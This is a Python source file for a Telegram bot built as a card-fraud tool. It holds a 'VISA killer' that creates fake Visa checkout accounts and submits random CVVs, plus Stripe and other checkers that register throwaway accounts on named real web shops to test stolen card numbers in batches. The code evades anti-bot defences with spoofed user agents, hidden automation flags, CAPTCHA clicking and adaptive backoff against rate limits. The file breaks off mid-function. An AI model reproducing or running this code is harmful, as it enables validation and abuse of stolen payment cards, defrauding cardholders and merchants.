# ==== 1. Imports & Environment Setup ====
import os
import time
import random
import asyncio
import json
import platform
import traceback
import re
import requests
import string
from datetime import datetime
from multiprocessing import Process

import nest_asyncio
import names
import psutil

from telegram import Update, Bot
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from multiprocessing import Process


from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from fake_useragent import UserAgent

# ==== 2. Global Configs ====
CHROME_PATH = "/usr/bin/google-chrome"
CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
BOT_TOKEN = os.environ["BOT_TOKEN"]
BOT_ADMIN_ID = int(os.environ.get("BOT_ADMIN_ID", "123456789"))

nest_asyncio.apply()
start_time = datetime.now()

approved_users = set([BOT_ADMIN_ID])
banned_users = set()
USER_DB_FILE = "users.json"

# ==== 3. Persistence & Auth Management (Per-Command) ====
USER_DB_FILE = "users.json"

# Commands we gate
CMD_KEYS = ("bin", "kill", "st", "bt", "au")

# Per-command approvals, plus a legacy/global "all" set
approved_cmds = {k: set() for k in CMD_KEYS}
approved_all = set()
banned_users = set()

# Back-compat: keep approved_users (used elsewhere); we’ll populate it with global approvals
approved_users = set()  # legacy global (used by old code paths)

def _ensure_admin_seed():
    # Admin always approved for everything
    for k in CMD_KEYS:
        approved_cmds[k].add(BOT_ADMIN_ID)
    approved_all.add(BOT_ADMIN_ID)
    approved_users.add(BOT_ADMIN_ID)

def load_users():
    _ensure_admin_seed()
    if os.path.exists(USER_DB_FILE):
        try:
            with open(USER_DB_FILE, "r") as f:
                data = json.load(f) or {}
            # Support both new and old formats
            # New format:
            per_cmd = data.get("per_cmd")
            if isinstance(per_cmd, dict):
                for k in CMD_KEYS:
                    approved_cmds[k].update(per_cmd.get(k, []))
            approved_all.update(data.get("approved_all", []))
            banned_users.update(data.get("banned", []))

            # Old format fallback (global approvals under "approved")
            if "approved" in data:
                approved_all.update(data.get("approved", []))

            # Keep legacy approved_users in sync with global approvals
            approved_users.clear()
            approved_users.update(approved_all)

        except Exception as e:
            print(f"⚠️ Failed to load users.json: {e}")

def save_users():
    try:
        with open(USER_DB_FILE, "w") as f:
            json.dump(
                {
                    "per_cmd": {k: sorted(list(v)) for k, v in approved_cmds.items()},
                    "approved_all": sorted(list(approved_all)),
                    "banned": sorted(list(banned_users)),
                },
                f,
            )
    except Exception as e:
        print(f"⚠️ Failed to save users.json: {e}")

def is_admin(uid): 
    return uid == BOT_ADMIN_ID

def is_approved(uid: int, cmd_key: str) -> bool:
    """Check per-command approval with global fallback and admin override."""
    if uid == BOT_ADMIN_ID:
        return True
    if uid in banned_users:
        return False
    if uid in approved_all:
        return True
    return uid in approved_cmds.get(cmd_key, set())

load_users()


load_users()

# ==== 4. Utility Functions ====
def is_admin(uid): return uid == BOT_ADMIN_ID

def format_timedelta(td):
    secs = int(td.total_seconds())
    hrs, rem = divmod(secs, 3600)
    mins, secs = divmod(rem, 60)
    return f"{hrs}h {mins}m {secs}s"
    

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return ""
    return chr(ord(country_code[0].upper()) + 127397) + chr(ord(country_code[1].upper()) + 127397)

def get_bin_info(bin_number):
    try:
        res = requests.get(f"https://lookup.binlist.net/{bin_number}", headers={"Accept-Version": "3"})
        if res.status_code == 200:
            data = res.json()
            brand = data.get("scheme", "Unknown").capitalize()
            type_ = data.get("type", "Unknown").upper()
            country = data.get("country", {}).get("name", "Unknown")
            country_code = data.get("country", {}).get("alpha2", "")
            bank = data.get("bank", {}).get("name", "Unknown")
            flag = get_flag_emoji(country_code)
            return f"{brand} • {type_} • {flag} {country} • {bank}"
    except:
        pass
    return "Unavailable"

    

def parse_card_input(text: str):
    text = text.replace(" ", "|").replace("/", "|").replace("\\", "|").replace("\n", "").strip()
    parts = text.split("|")
    if len(parts) != 4:
        return None
    card, mm, yyyy, cvv = parts
    return card, mm.zfill(2), yyyy[-2:], cvv

def extract_card_input(raw_text):
    raw_text = raw_text.replace(" ", "|").replace("/", "|").replace("\\", "|").replace("\n", "").strip()
    matches = re.findall(r"\d{12,19}.\d{1,2}.\d{2,4}.\d{3,4}", raw_text)
    return matches[0] if matches else None

def get_random_cvv(original, used=set()):
    while True:
        new = ''.join(random.choices('0123456789', k=3))
        if new != original and new not in used:
            used.add(new)
            return new

def random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    domains = [
        "gmail.com", "yahoo.com", "outlook.com", "mail.com", "protonmail.com",
        "icloud.com", "aol.com", "gmx.com", "zoho.com", "yandex.com",
        "hotmail.com", "live.com", "msn.com", "tutanota.com", "fastmail.com",
        "pm.me", "inbox.lv", "mail.ru", "mailfence.com", "hushmail.com",
        "posteo.net", "runbox.com", "startmail.com", "email.com", "keemail.me",
        "mailbox.org", "email.cz", "web.de", "t-online.de", "bluewin.ch",
        "seznam.cz", "laposte.net", "orange.fr", "btinternet.com", "sky.com",
        "virginmedia.com", "talktalk.net", "live.co.uk", "mail.co.uk"
    ]
    domain = random.choice(domains)
    return f"{name}@{domain}"


def random_password():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

def extract_bt_cards(text):
    return [line.strip() for line in text.splitlines() if re.search(r'\d{12,19}.*\d{1,2}.*\d{2,4}.*\d{3,4}', line)]

def run_bt_check(card_str, chat_id, message_id):
    asyncio.run(bt_check_async(card_str, chat_id, message_id))


# ==== 4.1 Basic Bot Commands ====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Welcome! Use /cmds to see available commands.")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("ℹ️ Use /cmds to view available commands.\nFor Stripe auth: /st <card>\nFor VISA killer: /kill <card>")

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await update.message.reply_text(f"🆔 Your Telegram ID: `{uid}`", parse_mode="Markdown")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = format_timedelta(datetime.now() - start_time)
    await update.message.reply_text(f"✅ Bot is running.\n⏱ Uptime: {uptime}")


async def bin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid, "bin"):
        await update.message.reply_text("⛔ You are not approved to use this command.")
        return

    raw = " ".join(context.args) if context.args else ""
    if not raw and update.message.reply_to_message:
        raw = update.message.reply_to_message.text

    if not raw:
        await update.message.reply_text("⚠️ Usage: /bin <bins/cards/mixed text>", parse_mode="Markdown")
        return

    # Extract all 6+ digit number sequences
    bin_candidates = set()
    for match in re.findall(r"\d{6,16}", raw):
        bin_candidates.add(match[:6])

    if not bin_candidates:
        await update.message.reply_text("❌ No valid BINs or cards found.", parse_mode="Markdown")
        return

    msg = "**🔍 BIN Lookup Results:**\n"
    for bin_ in sorted(bin_candidates):
        info = get_bin_info(bin_)
        msg += f"\n`{bin_}` → {info}"

    await update.message.reply_text(msg, parse_mode="Markdown")
   

# ==== 5. VISA KILLER (Auto-adjust wait) ====
def run_selenium_process(card_input, update_dict):
    asyncio.run(fill_checkout_form(card_input, update_dict))

async def fill_checkout_form(card_input, update_dict):
    uid = update_dict["user_id"]
    chat_id = update_dict["chat_id"]
    msg_id = update_dict["message_id"]
    bot = Bot(BOT_TOKEN)

    if not is_approved(uid, "kill"):
        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="🚫 You are not approved to use the bot.")
        return

    parsed = parse_card_input(card_input)
    if not parsed:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text="❌ Invalid format. Use: `/kill 1234567812345678|12|2026|123`",
            parse_mode="Markdown"
        )
        return

    card, mm, yy, original_cvv = parsed
    short_card = f"{card}|{mm}|{yy}|{original_cvv}"
    bin_info = get_bin_info(card[:6])

    await bot.edit_message_text(
        chat_id=chat_id,
        message_id=msg_id,
        text=f"💳 `{short_card}`\n🔁 Starting VISA kill automation...",
        parse_mode="Markdown"
    )

    start = time.time()

    first_name = names.get_first_name()
    last_name = names.get_last_name()
    email = f"{first_name.lower()}{random.randint(1000,9999)}@example.com"

    ua = UserAgent()
    options = webdriver.ChromeOptions()
    options.binary_location = CHROME_PATH
    options.add_argument(f"user-agent={ua.random}")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)

    service = Service(executable_path=CHROME_DRIVER_PATH)
    driver = webdriver.Chrome(service=service, options=options)
    wait = WebDriverWait(driver, 20)

    try:
        driver.get("https://secure.checkout.visa.com/createAccount")

        wait.until(EC.element_to_be_clickable((By.ID, "firstName"))).send_keys(first_name)
        driver.find_element(By.ID, "lastName").send_keys(last_name)
        driver.find_element(By.ID, "emailAddress").send_keys(email)

        ActionChains(driver).move_to_element(
            wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input.viewButton-button[value='Set Up']")))
        ).click().perform()

        wait.until(EC.element_to_be_clickable((By.ID, "cardNumber-CC"))).send_keys(card)
        driver.find_element(By.ID, "expiry").send_keys(f"{mm}/{yy}")
        driver.find_element(By.ID, "addCardCVV").send_keys(get_random_cvv(original_cvv))

        driver.find_element(By.ID, "first_name").send_keys(first_name)
        driver.find_element(By.ID, "last_name").send_keys(last_name)
        driver.find_element(By.ID, "address_line1").send_keys("123 Elm Street")
        driver.find_element(By.ID, "address_city").send_keys("New York")
        driver.find_element(By.ID, "address_state_province_code").send_keys("NY")
        driver.find_element(By.ID, "address_postal_code").send_keys("10001")
        driver.find_element(By.ID, "address_phone").send_keys("2025550104")

        try:
            driver.execute_script("arguments[0].click();", driver.find_element(By.ID, "country_code"))
            wait.until(EC.element_to_be_clickable((By.ID, "rf-combobox-1-item-1"))).click()
        except:
            pass

        ActionChains(driver).move_to_element(
            wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input.viewButton-button[value='Finish Setup']")))
        ).click().perform()

        used_cvvs = set()
        logs = []
        for attempt in range(8):
            try:
                new_cvv = get_random_cvv(original_cvv, used_cvvs)

                # Wait for CVV field to be ready
                input_field = wait.until(EC.element_to_be_clickable((By.ID, "addCardCVV")))
                input_field.clear()
                input_field.send_keys(new_cvv)

                # Click Finish Setup
                finish_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input.viewButton-button[value='Finish Setup']")))
                finish_btn.click()

                logs.append(f"• Try {attempt+1}: {new_cvv}")

                # Auto-adjust wait: wait until CVV field is clickable again
                wait.until(EC.element_to_be_clickable((By.ID, "addCardCVV")))

            except:
                logs.append(f"• Failed attempt {attempt+1}")

        duration = round(time.time() - start, 2)
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg_id,
            text=(
                f"💳 **Card:** `{short_card}`\n"
                f"🏦 **BIN:** `{bin_info}`\n\n"
                f"🔁 **CVV Attempts:**\n" + "\n".join(logs) + "\n\n"
                f"✅ **Status:** Killed Successfully\n"
                f"⏱ **Time:** {duration}s"
            ),
            parse_mode="Markdown"
        )

    except Exception:
        screenshot = "fail.png"
        driver.save_screenshot(screenshot)
        err_trace = traceback.format_exc()

        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="❌ VISA Kill failed.")
        await bot.send_photo(
            chat_id=BOT_ADMIN_ID,
            photo=open(screenshot, "rb"),
            caption=f"```\n{err_trace}\n```",
            parse_mode="Markdown"
        )
        os.remove(screenshot)

    finally:
        driver.quit()

async def kill_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in banned_users:
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return
    if uid not in approved_users:
        await update.message.reply_text("⛔ You are not approved to use this command.")
        return

    raw_input = " ".join(context.args).strip() if context.args else ""
    if not raw_input and update.message.reply_to_message:
        raw_input = update.message.reply_to_message.text.strip()

    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text("❌ Card input not found.\nUse: `/kill 1234123412341234|12|2026|123`", parse_mode="Markdown")
        return

    msg = await update.message.reply_text("⏳ Killing automation...", parse_mode="Markdown")
    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id,
        "text": card_input
    }
    Process(target=run_selenium_process, args=(card_input, update_dict), daemon=True).start()



# ==== 6. STRIPE AUTH V1 (/st) — Single + Batch Mode ==== #

from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

# --- Parse ALL cards in one go (handles spaces/newlines/slashes/pipes) ---
def extract_all_card_inputs(raw_text: str):
    t = (raw_text or "").replace("\r", "\n")
    t = t.replace("/", "|").replace("\\", "|").replace(" ", "|")
    return re.findall(r"\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}", t)

def run_st_process(payload, update_dict):
    asyncio.run(st_router(payload, update_dict))

async def st_router(payload, update_dict):
    if isinstance(payload, list) and len(payload) > 1:
        await st_batch_main(payload, update_dict)
    else:
        card_input = payload[0] if isinstance(payload, list) else payload
        await st_single_main(card_input, update_dict)

# ---------- Helpers ----------
def _wait_for_stripe_iframe(driver, timeout=12):
    """Wait until *any* Stripe Elements iframe appears."""
    end = time.time() + timeout
    SEL = ("iframe[name^='__privateStripeFrame'], "
           "iframe[src*='stripe'], "
           "iframe[src*='js.stripe.com'], "
           "iframe[src*='m.stripe.network']")
    while time.time() < end:
        if driver.find_elements(By.CSS_SELECTOR, SEL):
            return True
        time.sleep(0.4)
    return False

def _open_add_payment_form(driver, wait):
    """
    Click the 'Add payment method' button/link if visible.
    Fallback: navigate directly to the add-payment page.
    Returns True when Stripe iframes are present.
    """
    try:
        btn = wait.until(EC.element_to_be_clickable((
            By.XPATH,
            "//a[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'add payment method')]"
            " | //button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'add payment method')]"
        )))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", btn)
        driver.execute_script("arguments[0].click();", btn)
    except:
        pass
    if _wait_for_stripe_iframe(driver, 8):
        return True
    driver.get("https://www.shoprootscience.com/my-account/add-payment-method")
    return _wait_for_stripe_iframe(driver, 10)

def _is_too_soon(msg: str) -> bool:
    if not msg: return False
    m = msg.lower()
    return ("cannot add a new payment method so soon" in m) or ("too soon" in m)

# Adaptive Stripe filler
def _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=False):
    import time
    deadline = time.time() + 15
    stripe_iframes = []
    while time.time() < deadline:
        stripe_iframes = driver.find_elements(
            By.CSS_SELECTOR,
            "iframe[name^='__privateStripeFrame'], iframe[src*='stripe'], iframe[src*='js.stripe.com'], iframe[src*='m.stripe.network']"
        )
        if stripe_iframes:
            break
        time.sleep(0.4)
    if not stripe_iframes:
        raise Exception("❌ Stripe fields did not load")

    card_filled = expiry_filled = cvv_filled = False
    for iframe in stripe_iframes:
        if card_filled and expiry_filled and cvv_filled:
            break
        driver.switch_to.default_content()
        driver.switch_to.frame(iframe)

        number_candidates = [
            ("id", "Field-numberInput"),
            ("css", "input[name='cardnumber'], input[autocomplete='cc-number']"),
        ]
        expiry_candidates = [
            ("id", "Field-expiryInput"),
            ("css", "input[name='exp-date'], input[autocomplete='cc-exp']"),
        ]
        cvc_candidates = [
            ("id", "Field-cvcInput"),
            ("css", "input[name='cvc'], input[autocomplete='cc-csc']"),
        ]

        def _fill(cands, value):
            els = []
            for kind, sel in cands:
                els = driver.find_elements(By.ID, sel) if kind == "id" else driver.find_elements(By.CSS_SELECTOR, sel)
                if els:
                    break
            if not els:
                return False
            el = els[0]
            if clear_first:
                el.send_keys(Keys.CONTROL, "a")
                el.send_keys(Keys.BACKSPACE)
            el.send_keys(value)
            return True

        if not card_filled:
            card_filled = _fill(number_candidates, card)
        if not expiry_filled:
            expiry_filled = _fill(expiry_candidates, expiry)
        if not cvv_filled:
            cvv_filled = _fill(cvc_candidates, cvv)

    driver.switch_to.default_content()
    if not (card_filled and expiry_filled and cvv_filled):
        raise Exception("❌ Failed to fill all Stripe fields")

# ---------- SINGLE CARD ----------
async def st_single_main(card_input, update_dict):
    uid = update_dict["user_id"]
    chat_id = update_dict["chat_id"]
    msg_id = update_dict["message_id"]
    username = update_dict.get("username", "User")
    bot = Bot(BOT_TOKEN)

    parsed = parse_card_input(card_input)
    if not parsed:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text="❌ Invalid format.\nUse: `/st 4111111111111111|08|25|123`",
            parse_mode="Markdown"
        )
        return

    card, mm, yy, cvv = parsed
    expiry = f"{mm}/{yy}"
    full_card = f"{card}|{mm}|20{yy}|{cvv}"
    start_time = time.time()
    bin_info = get_bin_info(card[:6])

    try:
        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
        options = webdriver.ChromeOptions()
        options.binary_location = CHROME_PATH
        options.add_argument(f"user-agent={ua}")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--window-size=1920,1080")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)

        service = Service(executable_path=CHROME_DRIVER_PATH)
        driver = webdriver.Chrome(service=service, options=options)
        wait = WebDriverWait(driver, 15)

        email = f"user{random.randint(10000,99999)}@example.com"
        password = f"Pass{random.randint(1000,9999)}!"

        driver.get("https://www.shoprootscience.com/my-account/add-payment-method")

        for attempt in range(1, 4):
            try:
                if attempt > 1:
                    driver.refresh()
                    time.sleep(2)
                if attempt == 1:
                    wait.until(EC.element_to_be_clickable((By.ID, "reg_email"))).send_keys(email)
                    driver.find_element(By.ID, "reg_password").send_keys(password)
                    driver.find_element(By.NAME, "register").click()
                    time.sleep(3)

                try:
                    dismiss = driver.find_element(By.CLASS_NAME, "woocommerce-store-notice__dismiss-link")
                    driver.execute_script("arguments[0].click();", dismiss)
                except:
                    pass

                _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=False)
                wait.until(EC.element_to_be_clickable((By.ID, "place_order"))).click()

                # wait for success or error message
                status = "Declined"
                response_text = None
                for _ in range(10):  # 5s max
                    try:
                        success = driver.find_element(By.CSS_SELECTOR, "div.woocommerce-message")
                        if "successfully added" in success.text.lower():
                            status = "Approved"
                            response_text = success.text.strip()
                            break
                    except:
                        pass
                    try:
                        error = driver.find_element(By.CSS_SELECTOR, "ul.woocommerce-error li")
                        response_text = error.text.strip()
                        break
                    except:
                        pass
                    time.sleep(0.5)

                if not response_text:
                    response_text = "Unknown"

                took = f"{time.time() - start_time:.2f}s"
                emoji = "✅" if status == "Approved" else "❌"
                result_msg = (
                    f"💳 **Card:** `{full_card}`\n"
                    f"🏦 **BIN:** `{bin_info}`\n"
                    f"📟 **Status:** {emoji} **{status}**\n"
                    f"📩 **Response:** `{response_text}`\n"
                    f"🔁 **Attempt:** {attempt}/3\n"
                    f"🌐 **Gateway:** **Stripe-Auth-1**\n"
                    f"⏱ **Took:** **{took}**\n"
                    f"🧑‍💻 **Checked by:** **{username}** [`{uid}`]"
                )
                await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=result_msg, parse_mode="Markdown")
                return

            except Exception as e:
                if attempt == 3:
                    screenshot = "st_fail.png"
                    driver.save_screenshot(screenshot)
                    await bot.edit_message_text(chat_id=chat_id, message_id=msg_id,
                        text=f"❌ Failed after 3 attempts.\nError: `{str(e)}`",
                        parse_mode="Markdown")
                    await bot.send_photo(chat_id=BOT_ADMIN_ID,
                        photo=open(screenshot, "rb"),
                        caption=f"```\n{traceback.format_exc()}\n```",
                        parse_mode="Markdown")
                    os.remove(screenshot)
                    return
    finally:
        try:
            driver.quit()
        except:
            pass

# ---------- BATCH MODE (adaptive cooldown) ----------
async def st_batch_main(cards, update_dict):
    uid = update_dict["user_id"]
    chat_id = update_dict["chat_id"]
    msg_id = update_dict["message_id"]
    username = update_dict.get("username", "User")
    bot = Bot(BOT_TOKEN)

    try:
        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
        options = webdriver.ChromeOptions()
        options.binary_location = CHROME_PATH
        options.add_argument(f"user-agent={ua}")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--window-size=1920,1080")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)

        service = Service(executable_path=CHROME_DRIVER_PATH)
        driver = webdriver.Chrome(service=service, options=options)
        wait = WebDriverWait(driver, 15)

        email = f"user{random.randint(10000,99999)}@example.com"
        password = f"Pass{random.randint(1000,9999)}!"
        start_time = time.time()

        driver.get("https://www.shoprootscience.com/my-account/add-payment-method")
        wait.until(EC.element_to_be_clickable((By.ID, "reg_email"))).send_keys(email)
        driver.find_element(By.ID, "reg_password").send_keys(password)
        driver.find_element(By.NAME, "register").click()
        time.sleep(3)

        consolidated = []
        prev_was_approved = False

        # Adaptive cooldown settings
        adaptive_delay = 7
        MIN_DELAY = 6
        MAX_DELAY = 30

        for card_input in cards:
            parsed = parse_card_input(card_input)
            if not parsed:
                consolidated.append(
                    f"💳 `{card_input}`\n📩 Response: `Invalid format`\n📟 Status: ❌ Declined"
                )
                prev_was_approved = False
                time.sleep(adaptive_delay)
                # Decay delay gently after a normal decline
                adaptive_delay = max(MIN_DELAY, int(adaptive_delay * 0.85))
                continue

            card, mm, yy, cvv = parsed
            full_card = f"{card}|{mm}|20{yy}|{cvv}"
            expiry = f"{mm}/{yy}"

            # Ensure the Add Payment form is open and iframes are present
            if prev_was_approved:
                if not _open_add_payment_form(driver, wait):
                    raise Exception("Add Payment form did not appear after approval")
            else:
                if not _wait_for_stripe_iframe(driver, 6):
                    driver.get("https://www.shoprootscience.com/my-account/add-payment-method")
                    if not _wait_for_stripe_iframe(driver, 10):
                        raise Exception("Add Payment form did not load")

            # Fill + submit with one-shot recovery if iframes weren’t ready
            try:
                _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=not prev_was_approved)
            except Exception:
                _open_add_payment_form(driver, wait)
                if not _wait_for_stripe_iframe(driver, 10):
                    raise
                _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=True)

            wait.until(EC.element_to_be_clickable((By.ID, "place_order"))).click()

            # Poll for message
            status = "Declined"
            response_text = None
            for _ in range(10):
                try:
                    success = driver.find_element(By.CSS_SELECTOR, "div.woocommerce-message")
                    if "successfully added" in success.text.lower():
                        status = "Approved"
                        response_text = success.text.strip()
                        break
                except:
                    pass
                try:
                    error = driver.find_element(By.CSS_SELECTOR, "ul.woocommerce-error li")
                    response_text = error.text.strip()
                    break
                except:
                    pass
                time.sleep(0.5)
            if not response_text:
                response_text = "Unknown"

            # If site says "too soon", back off & retry this same card once
            if _is_too_soon(response_text):
                backoff = min(int(adaptive_delay * 1.5) + 2, MAX_DELAY)
                time.sleep(backoff)

                try:
                    if not _open_add_payment_form(driver, wait):
                        driver.get("https://www.shoprootscience.com/my-account/add-payment-method")
                        _wait_for_stripe_iframe(driver, 10)

                    _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=True)
                    wait.until(EC.element_to_be_clickable((By.ID, "place_order"))).click()

                    # Re-evaluate after retry
                    status = "Declined"
                    response_text = None
                    for _ in range(10):
                        try:
                            success = driver.find_element(By.CSS_SELECTOR, "div.woocommerce-message")
                            if "successfully added" in success.text.lower():
                                status = "Approved"
                                response_text = success.text.strip()
                                break
                        except:
                            pass
                        try:
                            error = driver.find_element(By.CSS_SELECTOR, "ul.woocommerce-error li")
                            response_text = error.text.strip()
                            break
                        except:
                            pass
                        time.sleep(0.5)
                    if not response_text:
                        response_text = "Unknown"
                except:
                    # ignore errors on retry — continue with whatever we have
                    pass

                # Increase base delay for the next cards (gentle exponential backoff)
                adaptive_delay = min(int(adaptive_delay * 1.4) + 1, MAX_DELAY)

            elif status == "Approved":
                # Approvals often trigger tighter anti-spam — nudge delay up a bit
                adaptive_delay = min(max(adaptive_delay + 1, MIN_DELAY + 1), MAX_DELAY)
            else:
                # Normal: slowly decay toward a floor
                adaptive_delay = max(MIN_DELAY, int(adaptive_delay * 0.85))

            consolidated.append(
                f"💳 `{full_card}`\n📩 Response: `{response_text}`\n📟 Status: {'✅' if status=='Approved' else '❌'} {status}"
            )
            prev_was_approved = (status == "Approved")

            # Adaptive cooldown before next card
            time.sleep(adaptive_delay)

        took = f"{time.time() - start_time:.2f}s"
        final_msg = "\n\n".join(consolidated) + f"\n\n🌐 Gateway: Stripe-Auth-1\n⏱ Took: {took}\n🧑‍💻 Checked by: **{username}** [`{uid}`]"
        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=final_msg, parse_mode="Markdown")

    except Exception:
        screenshot = "st_batch_fail.png"
        driver.save_screenshot(screenshot)
        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="❌ Process failed.", parse_mode="Markdown")
        await bot.send_photo(chat_id=BOT_ADMIN_ID, photo=open(screenshot, "rb"),
                             caption=f"```\n{traceback.format_exc()}\n```", parse_mode="Markdown")
        os.remove(screenshot)
    finally:
        try:
            driver.quit()
        except:
            pass

# ==== 7. /st Command ==== #
async def st_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    uname = update.effective_user.first_name or "User"

    if not is_approved(uid, "st"):
        await update.message.reply_text("⛔ You are not approved to use this command.")
        return

    raw_input = " ".join(context.args).strip() if context.args else ""
    if not raw_input and update.message.reply_to_message:
        raw_input = (update.message.reply_to_message.text or "").strip()

    cards = extract_all_card_inputs(raw_input)

    if not cards:
        await update.message.reply_text("❌ No valid card found.\nUse: `/st 4111111111111111|08|25|123`", parse_mode="Markdown")
        return

    if len(cards) > 10:
        await update.message.reply_text("⚠️ You can send a maximum of 10 cards at once.")
        return

    if len(cards) == 1:
        msg = await update.message.reply_text(f"💳 `{cards[0]}`", parse_mode="Markdown")
    else:
        msg = await update.message.reply_text(f"⏳ Mass checking **{len(cards)}** cards…", parse_mode="Markdown")

    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id,
        "username": uname,
    }
    Process(target=run_st_process, args=(cards if len(cards) > 1 else cards[0], update_dict), daemon=True).start()





# ==== 7.1 /bt Command ==== #

def run_bt_check(card_str, chat_id, message_id):
    asyncio.run(_bt_check(card_str, chat_id, message_id))

async def _bt_check(card_str, chat_id, message_id):
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from fake_useragent import UserAgent
    import tempfile
    import shutil

    start = time.time()
    bot = Bot(BOT_TOKEN)

    def extract_card_parts(card_str):
        match = re.search(r'(\d{12,19})\D+(\d{1,2})[\/|]?(20)?(\d{2,4})\D+(\d{3,4})', card_str)
        if not match:
            return None
        return match.group(1), match.group(2).zfill(2), match.group(4)[-2:], match.group(5)

    async def fail_user():
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text="❌ Payment failed. Try again later.",
            parse_mode="Markdown"
        )

    async def fail_admin(trace):
        screenshot = "bt_fail.png"
        try:
            driver.save_screenshot(screenshot)
            await bot.send_photo(
                chat_id=BOT_ADMIN_ID,
                photo=open(screenshot, "rb"),
                caption=f"```\n{trace}\n```",
                parse_mode="Markdown"
            )
            os.remove(screenshot)
        except:
            await bot.send_message(
                chat_id=BOT_ADMIN_ID,
                text=f"BT Exception:\n```\n{trace}\n```",
                parse_mode="Markdown"
            )

    for attempt in range(1, 4):
        temp_profile_dir = tempfile.mkdtemp()
        try:
            ua = UserAgent()
            options = webdriver.ChromeOptions()
            options.binary_location = CHROME_PATH
            options.add_argument(f"--user-data-dir={temp_profile_dir}")
            options.add_argument(f"user-agent={ua.random}")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_argument("--headless=new")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--window-size=1920,1080")
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            options.add_experimental_option("prefs", {
                "profile.managed_default_content_settings.images": 2,
                "profile.managed_default_content_settings.stylesheets": 2
            })

            driver = webdriver.Chrome(service=Service(CHROME_DRIVER_PATH), options=options)
            wait = WebDriverWait(driver, 20)

            # 1. Go to billing address form
            driver.get("https://truedark.com/my-account/edit-address/billing/")
            time.sleep(1)

            try:
                iframe = driver.find_element(By.CSS_SELECTOR, "iframe[src*='turnstile']")
                driver.switch_to.frame(iframe)
                wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input[type='checkbox']"))).click()
                driver.switch_to.default_content()
                time.sleep(1)
            except:
                pass

            try:
                popup = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(@class, 'klaviyo-close-form')]")))
                popup.click()
            except:
                pass

            email = random_email()
            password = random_password()

            wait.until(EC.presence_of_element_located((By.ID, "reg_email"))).send_keys(email)
            wait.until(EC.presence_of_element_located((By.ID, "reg_password"))).send_keys(password)
            wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(@class,'woocommerce-form-register__submit')]"))).click()

            # Auto-adjust wait for billing country field (instead of fixed sleep)
